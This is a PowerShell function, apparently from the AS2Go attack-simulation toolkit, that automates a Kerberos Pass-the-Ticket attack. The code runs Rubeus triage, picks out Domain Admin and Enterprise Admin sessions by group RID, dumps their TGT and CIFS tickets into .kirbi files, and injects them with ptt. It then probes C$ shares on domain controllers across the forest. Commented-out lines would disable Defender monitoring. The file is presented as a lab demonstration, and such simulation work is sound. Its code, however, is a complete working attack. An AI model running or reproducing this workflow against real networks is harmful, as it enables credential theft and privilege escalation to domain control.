<#
.SYNOPSIS
Harvests and reuses Kerberos tickets on the local machine in the AS2Go Pass-the-Ticket demonstration.

.DESCRIPTION
Harvests tickets on the machine running AS2Go with Rubeus instead of Mimikatz. Nothing leaves this machine.
Analyzes Rubeus triage output, resolves each candidate's AD group membership via its own domain, and
recommends an account that holds a TGT and membership in a high-value privileged group (Enterprise Admins,
Domain Admins, or Account Operators), since the goal is to be able to make a change in AD, not merely to
hold any service ticket. Allows another candidate, dumps its tickets with Rubeus as .kirbi files, and
injects them back with Rubeus ptt.
Displays cached tickets and attempts to enumerate DC C$ shares across forest domains using the resulting context.

.EXAMPLE
Invoke-PassTheTicketAttackLocalMachine
Runs this workflow using the loaded AS2Go module.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires Rubeus.exe in the configured tools path, and usable tickets on the local machine.
The workflow removes old .kirbi files in the local AS2Go tickets folder before collecting tickets.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Harvests Kerberos tickets on the local machine with Rubeus triage and dump instead of Mimikatz.
Resolves candidate accounts' AD group membership to recommend one that can make a change in AD,
injects its TGT back with Rubeus ptt, and inspects cached tickets after injection. Attempts to list
domain controller admin shares across the forest.
#>
function Invoke-PassTheTicketAttackLocalMachine {

    $Info = Measure-FunctionRuntime -Begin

    Show-CurrentPhase -Phase "ASP07_PtTLocal.html"

    $Rubeus = Join-Path -Path $Script:ASTools -ChildPath "Rubeus.exe"
    
    $TicketsToAbusePath = $Script:AS2GoTicketsDir

    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Pass-the-Ticket (PtT) Attack - Local Machine"
    Write-AS2GoOutput -Type H1 -Message "This attack simulates a Pass-the-Ticket (PtT) attack that runs completely on the local machine. `nIn this case, we dump tickets from memory with Rubeus and inject them back with Rubeus ptt, and we will try to access the Domain Controller's c$ share. `nAll steps run locally on this machine using '$Rubeus'.`n"
    Write-AS2GoOutput -Type Bullet -Message "Step #1 - run Rubeus triage on the local machine"
    Write-AS2GoOutput -Type Bullet -Message "Step #2 - dump tickets with Rubeus on the local machine"
    Write-AS2GoOutput -Type Bullet -Message "Step #3 - run PtT to become a Tier 0 Admin"
    Write-Host ""

    If ($UnAttended) { Start-Sleep 2 } else {

        $Options = @(
            [pscustomobject] @{
                Label = "&Skip"
                Help  = "The prerequisites are not met. Skip the PtT simulation."
                Value = $Script:No
            }
        )

        if (-not $SafeMode) {
            $Options += [pscustomobject] @{
                Label = "&Yes"
                Help  = "All prerequisites are met. Proceed with the PtT simulation."
                Value = $Script:Yes
            }
        }

        $title = "Is the local machine ready for the Pass-the-Ticket (PtT) attack?"
        $message = "Please confirm that the following prerequisites are met:`n  • Rubeus.exe is present at $Rubeus.`n  • Endpoint protection is disabled for the tools folder in the test environment."
        $decision = Show-DecisionPrompt -Message $message -Options $Options -Default ($Options.Count - 1) -Title $title

        If ($decision -eq $Script:No) {
            Write-AS2GoOutput -Type Quit -Message "Local machine is not ready for the Pass-the-Ticket (PtT) attack."
            Measure-FunctionRuntime -End -Details $Info
            return
        }
    }

    If (-not $SkipClearHost) { Clear-Host }

    If (-not (Test-Path $Rubeus -PathType Leaf)) {
        Write-AS2GoOutput -Type Error -Message "Rubeus.exe was not found at '$Rubeus'. Add it to the tools folder and run the setup again."
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    # remove all old tickets and prepare the directory
    If (-not (Test-Path $TicketsToAbusePath)) {
        New-Item -Path $TicketsToAbusePath -ItemType Directory -Force | Out-Null
    }
    else {
        Remove-Item -Path "$TicketsToAbusePath\*.kirbi" -Force -ErrorAction SilentlyContinue
    }

    Write-AS2GoOutput -Type Header -Message "Run Rubeus triage on the local machine"
    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = "& '$Rubeus' triage"
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    #Set-MpPreference -DisableRealtimeMonitoring $true
    Try {
        $triageText = & $Rubeus triage 2>&1 | Out-String
    }
    Finally {
        #Set-MpPreference -DisableRealtimeMonitoring $false
    }

    # Parse triage output; supports the pipe table and the legacy block format.
    # Same user name can appear in several logon sessions; merge them so the
    # candidate menu shows one entry per user and the dump uses the best session.
    # Resolve each candidate's AD group membership via its own Domain (queried as -Server,
    # same pattern as Invoke-OverPassTheHashAttack) so RID 519/512/548 membership - not just
    # "has a TGT and a service ticket" - can identify who can actually make a change in AD.
    $BestResults = Get-RubeusTriageSessions -TriageOutput $triageText |
    Group-Object UserName |
    ForEach-Object {
        # Prefer sessions that offer both a TGT and a service ticket; on a tie, prefer the
        # longest-still-valid TGT.
        $sessions = @($_.Group | Sort-Object @{ Expression = { [bool]$_.TGTSpn -and [bool]$_.ServiceSpn }; Descending = $true }, @{ Expression = 'TGTEndTime'; Descending = $true })
        $sessions[0]
    } |
    ForEach-Object {
        # Resolved for every candidate with a known domain, not only ones with a usable TGT,
        # so the table still shows a privileged account's group membership even when its only
        # cached ticket is a cross-realm referral and it cannot currently be selected.
        $membership = @()
        If ($_.Domain) {
            $membership = @(Get-ADPrincipalGroupMembership -Identity $_.UserName -Server $_.Domain -ErrorAction SilentlyContinue |
                Select-Object -Property Name, SID)
        }
        $_ | Select-Object *,
        @{ Name = 'GroupMembership'; Expression = { ($membership | ForEach-Object { $_.Name }) -join ', ' } },
        @{ Name = 'GroupMembershipRids'; Expression = { ($membership | ForEach-Object { $_.SID.Value.Split('-')[-1] }) -join ', ' } }
    }

    If ($BestResults.Count -gt 0) {
        write-host "`n"
        Write-AS2GoOutput -Type Success -Message "Rubeus triage succeeded. `
       $($BestResults.Count) user logon sessions with Kerberos tickets were found on the local machine." -NoExtraLines
    }
    else {
        Write-AS2GoOutput -Type Error -Message "Rubeus triage failed. `
             No user logon sessions with Kerberos tickets were found on the local machine. `
             Log on with a domain account and run the attack again."
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    $BestResults | Format-Table LUID, UserName, TGTSpn, CrossRealmTGTSpn, ServiceSpn, GroupMembershipRids -AutoSize | out-host

    # Best candidate: a TGT is mandatory (nothing to dump/inject without one). Among
    # qualifying candidates, prefer membership in the highest-value privileged group
    # (519 Enterprise Admins, 512 Domain Admins, 548 Account Operators - same RID
    # priority as Invoke-OverPassTheHashAttack), since the point is to be able to make
    # a change in AD, not merely to hold any service ticket. Within the same RID tier,
    # prefer a candidate that already has a usable service ticket, then the longest-still-valid TGT.
    $bestLocalUser = $null
    foreach ($Rid in 519, 512, 548) {
        $bestLocalUser = $BestResults |
        Where-Object { $_.TGTSpn -and $_.GroupMembershipRids -match "(?<!\d)$Rid(?!\d)" } |
        Sort-Object @{ Expression = { [bool]$_.ServiceSpn }; Descending = $true }, @{ Expression = 'TGTEndTime'; Descending = $true } |
        Select-Object -First 1
        If ($bestLocalUser) { break }
    }

    # No high-value RID match: fall back to the previous heuristic (TGT + service ticket).
    If (-not $bestLocalUser) {
        $bestLocalUser = $BestResults |
        Where-Object { $_.TGTSpn -and $_.ServiceSpn } |
        Sort-Object @{ Expression = 'TGTEndTime'; Descending = $true } |
        Select-Object -First 1
    }

    If (-not $bestLocalUser) {
        $bestLocalUser = $BestResults | Where-Object { $_.TGTSpn } | Select-Object -First 1
    }

    $options = @(New-HelpOptions -InputObject $BestResults -Label 'UserName' -Help 'GroupMembershipRids' -Value "UserName" -AddSkip)
    $candidate = $bestLocalUser.UserName
    $index = [array]::IndexOf($BestResults.UserName, $candidate)


    If (-not $candidate) { $candidate = $BestResults[0].UserName }
    Write-AS2GoOutput -Type Textmaker -Message "Based on privileged group membership and ticket availability,`n      the primary Pass-the-Ticket candidate was identified as:" -TM $candidate

    $title = "Confirm or change the account whose tickets will be dumped"
    $message = ""
    $candidate = Show-DecisionPrompt -Options $options -Default $index -Title $title #-Message $message



    If (-not $SkipClearHost) { Clear-Host }

    ###############################################################################################################################

    Write-AS2GoOutput -Type Header -Message "Dump tickets with Rubeus for candidate '$candidate'"

    $selectedOwner = $BestResults | Where-Object { $_.UserName -eq $candidate } | Select-Object -First 1

    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = "& '$Rubeus' dump /luid:$($selectedOwner.LUID) /service:krbtgt /nowrap"
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    #Set-MpPreference -DisableRealtimeMonitoring $true
    # dump output also contains a "Base64(key)" field ahead of "Base64EncodedTicket" that is
    # itself 100+ base64 characters long, so the extraction below must anchor on the
    # "Base64EncodedTicket" label rather than matching the first long base64 run in the text.
    $ticketPattern = '(?s)Base64EncodedTicket\s*:\s*\r?\n\r?\n\s*([A-Za-z0-9+/=]{100,})'
    Try {
        # dump prints Base64 only; /outfile is not a valid dump switch, so each
        # ticket type is dumped with /nowrap and decoded into a .kirbi file here.
        $tgtBase64 = (& $Rubeus dump /luid:$($selectedOwner.LUID) /service:krbtgt /nowrap 2>&1 | Out-String)
        $cifsBase64 = (& $Rubeus dump /luid:$($selectedOwner.LUID) /service:cifs /nowrap 2>&1 | Out-String)

        $tgtBlob = [regex]::Match($tgtBase64, $ticketPattern).Groups[1].Value
        $cifsBlob = [regex]::Match($cifsBase64, $ticketPattern).Groups[1].Value

        If ($tgtBlob) {
            [IO.File]::WriteAllBytes("$TicketsToAbusePath\$candidate-tgt.kirbi", [Convert]::FromBase64String($tgtBlob))
        }
        If ($cifsBlob) {
            [IO.File]::WriteAllBytes("$TicketsToAbusePath\$candidate-cifs.kirbi", [Convert]::FromBase64String($cifsBlob))
        }
    }
    Catch {
        Write-AS2GoOutput -Type Warning -Message "Failed to decode or write a dumped ticket for candidate '$candidate': $_"
    }
    Finally {
        #Set-MpPreference -DisableRealtimeMonitoring $false
    }

    $results = Get-Item "$TicketsToAbusePath\*.kirbi" -ErrorAction SilentlyContinue

    If ($results) {
        write-host "`n"
        $results | Format-Table Name
        Write-AS2GoOutput -Type Success -Message "$($results.Count) 'kirbi' files were dumped to: $TicketsToAbusePath" -NoExtraLines
        write-log INFO -Message "Rubeus dumped tickets for candidate '$candidate' locally: $($results.Name -join ', ')"
    }
    else {
        Write-AS2GoOutput -Type Error -Message "Rubeus dump failed. No 'kirbi' files were found in: $TicketsToAbusePath"
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    ###############################################################################################################################

    Write-AS2GoOutput -Type Header -Message "load stolen tickets from candidate '$candidate'"

    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = 'Get-ChildItem "' + $TicketsToAbusePath + '\*.kirbi" | ForEach-Object { & "' + $Rubeus + '" ptt /ticket:"$($_.FullName)" }'
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    # Rubeus ptt injects one .kirbi per call, so each file is passed separately.
    $injected = Get-ChildItem -Path "$TicketsToAbusePath\*.kirbi" -File | ForEach-Object {
        & $Rubeus ptt /ticket:"$($_.FullName)" 2>&1 | Out-String
    }
    $injected | Out-Host

    Write-AS2GoOutput -Type Success -Message "Rubeus injected the tickets into the local logon session."

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Display currently cached Kerberos tickets"
    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = "klist"
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

    Set-ASConfig -Setting "LastStage" -Value $Script:PtT
    Set-NewColorSchema -NewStage $Script:PtT

    $tickets = Get-KlistTicket -Client $candidate
    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
    Write-AS2GoOutput -Type textmaker -Message "Last Ticket for client" -tm $candidate
    $tickets | Select-Object -Last 1 | Format-List

    if ($tickets.Count -eq 0) {
        Write-AS2GoOutput -Type Error -Message "No Kerberos tickets found for client '$candidate'"
    }
    else {
        Write-AS2GoOutput -Type Success -Message "Kerberos tickets found for client '$candidate'"
    }

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    Test-AccessToOneDCPerDomain

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Measure-FunctionRuntime -End -Details $Info
}
